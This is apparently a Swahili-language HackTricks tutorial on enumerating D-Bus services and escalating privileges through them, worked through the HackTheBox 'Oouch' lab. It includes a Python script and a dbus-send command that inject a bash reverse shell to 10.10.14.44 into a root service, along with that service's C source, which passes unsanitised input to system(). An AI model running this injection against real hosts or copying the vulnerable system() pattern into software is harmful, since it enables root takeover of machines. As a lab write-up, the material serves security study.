# Uchunguzi wa D-Bus na Kujiongezea Mamlaka kwa Kutumia Amri

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Uchunguzi wa GUI**

D-Bus hutumiwa kama mpatanishi wa mawasiliano kati ya michakato kwenye mazingira ya desktop ya Ubuntu. Kwenye Ubuntu, utaona uendeshaji wa pamoja wa mabasi kadhaa ya ujumbe: basi la mfumo, linalotumiwa hasa na **huduma zenye mamlaka ya juu kuonyesha huduma muhimu kote kwenye mfumo**, na basi la kikao kwa kila mtumiaji aliyeingia, linaloonyesha huduma muhimu tu kwa mtumiaji huyo maalum. Hapa, lengo kuu ni basi la mfumo kutokana na uhusiano wake na huduma zinazofanya kazi kwa mamlaka ya juu (k.m., root) kwani lengo letu ni kuongeza mamlaka. Inafahamika kuwa muundo wa D-Bus unatumia 'router' kwa kila basi la kikao, ambayo inahusika na kupeleka ujumbe wa wateja kwa huduma sahihi kulingana na anwani iliyoainishwa na wateja kwa huduma wanayotaka kuwasiliana nayo.

Huduma kwenye D-Bus zinatambuliwa na **vitu** na **interfaces** wanazotoa. Vitu vinaweza kufananishwa na instensi za darasa katika lugha za OOP za kawaida, na kila instensi inatambuliwa kwa kipekee na **njia ya kitu**. Njia hii, kama njia ya mfumo wa faili, inatambua kipekee kila kitu kinachotolewa na huduma. Kiolesura muhimu kwa madhumuni ya utafiti ni kiolesura cha **org.freedesktop.DBus.Introspectable**, kikiwa na njia moja tu, Introspect. Njia hii inarudisha uwakilishi wa XML wa njia zinazoungwa mkono na kitu, ishara, na mali, na lengo kuu hapa ni njia huku mali na ishara zikisahauliwa.

Kwa mawasiliano na kiolesura cha D-Bus, zilitumika zana mbili: zana ya CLI iliyoitwa **gdbus** kwa wito rahisi wa njia zinazotolewa na D-Bus kwenye hati, na [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), zana ya GUI iliyoundwa kwa Python ili kuorodhesha huduma zinazopatikana kwenye kila basi na kuonyesha vitu vilivyomo ndani ya kila huduma.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


Katika picha ya kwanza, huduma zilizosajiliwa na D-Bus kwenye mfumo wa basi zinaonyeshwa, na **org.debin.apt** ikilengwa hasa baada ya kuchagua kifungo cha Basi la Mfumo. D-Feet inauliza huduma hii kwa vitu, inaonyesha interface, njia, mali, na ishara kwa vitu vilivyochaguliwa, kama inavyoonekana kwenye picha ya pili. Saini ya kila njia pia imeelezewa.

Kitu cha kuzingatia ni kuonyeshwa kwa **kitambulisho cha mchakato (pid)** na **mstari wa amri**, ambao ni muhimu kwa kuthibitisha ikiwa huduma inaendeshwa na mamlaka ya juu, jambo muhimu kwa utafiti unaofaa.

**D-Feet pia inaruhusu wito wa njia**: watumiaji wanaweza kuingiza maelezo ya Python kama parameta, ambayo D-Feet inabadilisha kuwa aina za D-Bus kabla ya kuzipitisha kwa huduma.

Hata hivyo, kumbuka kuwa **baadhi ya njia zinahitaji uwakilishi** kabla ya kuturuhusu kuziita. Tutapuuza njia hizi, kwani lengo letu ni kuinua mamlaka yetu bila kuwa na nywila kwanza.

Pia kumbuka kuwa baadhi ya huduma zinauliza huduma nyingine ya D-Bus iliyoitwa org.freedeskto.PolicyKit1 ikiwa mtumiaji anapaswa kuruhusiwa kufanya vitendo fulani au la.

## **Uchunguzi wa Mstari wa Amri**

### Orodhesha Vitu vya Huduma

Inawezekana kuorodhesha interface za D-Bus zilizofunguliwa na:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Uhusiano

[Kutoka wikipedia:](https://sw.wikipedia.org/wiki/D-Bus) Wakati mchakato unapoweka uhusiano na basi, basi inamteua uhusiano jina maalum la basi linaloitwa _jina la uhusiano la kipekee_. Majina ya basi ya aina hii hayabadiliki - inahakikishwa kuwa hayatabadilika muda mrefu uhusiano unapoendelea kuwepo - na, zaidi ya hayo, hawezi kutumika tena wakati wa maisha ya basi. Hii inamaanisha kuwa hakuna uhusiano mwingine na basi hiyo atapewa jina la uhusiano la kipekee kama hilo, hata ikiwa mchakato huo hufunga uhusiano na basi na kuunda mpya. Majina ya uhusiano ya kipekee ni rahisi kutambulika kwa sababu yananza na herufi ya mkato - ambayo kwa kawaida haikubaliki.

### Habari ya Kitu cha Huduma

Kisha, unaweza kupata habari fulani kuhusu kiolesura na:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Orodhesha Interface za Kitu cha Huduma

Unahitaji kuwa na ruhusa za kutosha.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Kuchunguza Kiolesura cha Kitu cha Huduma

Tazama jinsi katika mfano huu ilivyochaguliwa kiolesura cha hivi karibuni kilichogunduliwa kwa kutumia parameter ya `tree` (_angalia sehemu iliyotangulia_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Chukua tahadhari na njia `.Block` ya kiolesura `htb.oouch.Block` (ile tunayopendezwa nayo). "s" katika safu zingine inaweza kuashiria kuwa inatarajia herufi.

### Kufuatilia/Kukamata Kiolesura

Ukiwa na mamlaka ya kutosha (mamlaka ya `send_destination` na `receive_sender` pekee hayatoshi), unaweza **kufuatilia mawasiliano ya D-Bus**.

Ili **kufuatilia** **mawasiliano**, utahitaji kuwa **root**. Ikiwa bado una matatizo kuwa root, angalia [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) na [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
Ikiwa unajua jinsi ya kusanidi faili ya usanidi ya D-Bus ili **kuruhusu watumiaji wasio na mamlaka ya root kufuatilia** mawasiliano, tafadhali **wasiliana nami**!
{% endhint %}

Njia tofauti za kufuatilia:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Katika mfano ufuatao, kiolesura `htb.oouch.Block` kinachunguzwa na **ujumbe "**_**lalalalal**_**" unatumwa kupitia mawasiliano yasiyofaa**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Unaweza kutumia `capture` badala ya `monitor` ili kuokoa matokeo katika faili ya pcap.

#### Kuchuja kelele zote <a href="#kuchuja_kelele_zote" id="kuchuja_kelele_zote"></a>

Ikiwa kuna habari nyingi sana kwenye basi, tumia sheria ya kulingana kama ifuatavyo:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Sheria kadhaa zinaweza kutajwa. Ikiwa ujumbe unalingana na _mojawapo_ ya sheria hizo, ujumbe utachapishwa. Kama ifuatavyo:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Angalia [hati ya D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) kwa maelezo zaidi juu ya sintaksia ya sheria za mechi.

### Zaidi

`busctl` ina chaguo zaidi, [**pata zote hapa**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Hali ya Kudhoofika**

Kama mtumiaji **qtc ndani ya mwenyeji "oouch" kutoka HTB**, unaweza kupata **faili ya usanidi ya D-Bus isiyotarajiwa** iliyoko _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Tahadhari kutoka kwa usanidi uliopita kwamba **utahitaji kuwa mtumiaji `root` au `www-data` ili kutuma na kupokea habari** kupitia mawasiliano ya D-BUS haya.

Kama mtumiaji **qtc** ndani ya kontena la docker **aeb4525789d8** unaweza kupata nambari kadhaa zinazohusiana na dbus katika faili _/code/oouch/routes.py._ Hii ndiyo nambari inayovutia:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Kama unavyoona, inaunganisha kwenye kiolesura cha D-Bus na kutuma "client_ip" kwa kazi ya "Block".

Upande mwingine wa uhusiano wa D-Bus kuna programu iliyoundwa kwa C inayofanya kazi. Msimbo huu unakuwa "ukisikiliza" kwenye uhusiano wa D-Bus kwa anwani ya IP na kuita iptables kupitia kazi ya `system` ili kuzuia anwani ya IP iliyotolewa.\
Wito wa `system` una hatari ya kuingizwa kwa amri, kwa hivyo mzigo kama ufuatao utaunda kitanzi cha nyuma: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Tumia udhaifu huo

Mwishoni mwa ukurasa huu unaweza kupata msimbo kamili wa C wa programu ya D-Bus. Ndani yake, kati ya mistari 91-97, unaweza kupata jinsi `njia ya kitu cha D-Bus` na `jina la kiolesura` vinavyosajiliwa. Habari hii itakuwa muhimu kutuma habari kwenye uhusiano wa D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Pia, katika mstari wa 57 unaweza kupata kwamba **njia pekee iliyosajiliwa** kwa mawasiliano haya ya D-Bus inaitwa `Block`(_**Ndiyo sababu katika sehemu inayofuata mizigo itatumwa kwa kitu cha huduma `htb.oouch.Block`, kiolesura `/htb/oouch/Block` na jina la njia `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Msimbo wa python ufuatao utatuma mzigo kwa uhusiano wa D-Bus kwa njia ya njia ya `Block` kupitia `block_iface.Block(runme)` (_kumbuka kuwa ulichukuliwa kutoka kwa kipande cha msimbo kilichotangulia_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl na dbus-send

`busctl` na `dbus-send` ni zana za amri zinazotumiwa kufanya uchunguzi na kudhibiti mfumo wa D-Bus kwenye mifumo ya Linux. D-Bus ni mfumo wa ujumbe unaoruhusu mawasiliano kati ya michakato tofauti kwenye mfumo wa Linux.

`busctl` inaruhusu mtumiaji kuona habari kuhusu vikao vya D-Bus, huduma zinazopatikana, na mali zinazoweza kupatikana. Inaweza pia kutumiwa kuchunguza na kudhibiti ujumbe unaotumwa kwenye vikao vya D-Bus.

`dbus-send` inaruhusu mtumiaji kutuma ujumbe wa D-Bus kwa huduma au mali zinazopatikana. Inaweza kutumiwa kwa madhumuni ya kudhibiti na kufanya mabadiliko kwenye mfumo wa D-Bus.

Zana hizi zinaweza kutumiwa kwa njia mbaya kwa kufanya uchunguzi wa mfumo, kubainisha mali zinazoweza kudhibitiwa, na hatimaye kufanya uchumaji wa mamlaka (privilege escalation). Ni muhimu kwa watumiaji kufahamu hatari hizi na kutekeleza hatua za usalama ili kuzuia matumizi mabaya ya zana hizi.
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` ni zana inayotumiwa kutuma ujumbe kwa "Message Bus"
* Message Bus - Programu inayotumiwa na mifumo kuwezesha mawasiliano kati ya programu kwa urahisi. Inahusiana na Message Queue (ujumbe huwasilishwa kwa utaratibu) lakini kwenye Message Bus ujumbe hupelekwa kwa mfano wa usajili na pia ni haraka sana.
* "–system" tag hutumiwa kuonyesha kuwa ni ujumbe wa mfumo, sio ujumbe wa kikao (kwa chaguo-msingi).
* "–print-reply" tag hutumiwa kuonyesha ujumbe wetu kwa njia inayoeleweka na kupokea majibu yoyote kwa muundo unaoweza kusomwa na binadamu.
* "–dest=Dbus-Interface-Block" Anwani ya kiolesura cha Dbus.
* "–string:" - Aina ya ujumbe tunayotaka kutuma kwa kiolesura. Kuna muundo kadhaa wa kutuma ujumbe kama vile double, bytes, booleans, int, objpath. Kati ya haya, "object path" ni muhimu tunapotaka kutuma njia ya faili kwa kiolesura cha Dbus. Tunaweza kutumia faili maalum (FIFO) katika kesi hii kupeleka amri kwa kiolesura kwa jina la faili. "string:;" - Hii ni kuita tena njia ya kitu ambapo tunaweka faili ya shell ya FIFO / amri.

_Taarifa kwamba katika `htb.oouch.Block.Block`, sehemu ya kwanza (`htb.oouch.Block`) inahusiana na huduma ya kitu na sehemu ya mwisho (`.Block`) inahusiana na jina la njia._

### Msimbo wa C

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## Marejeo
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

<details>

<summary><strong>Jifunze kuhusu kuhack AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
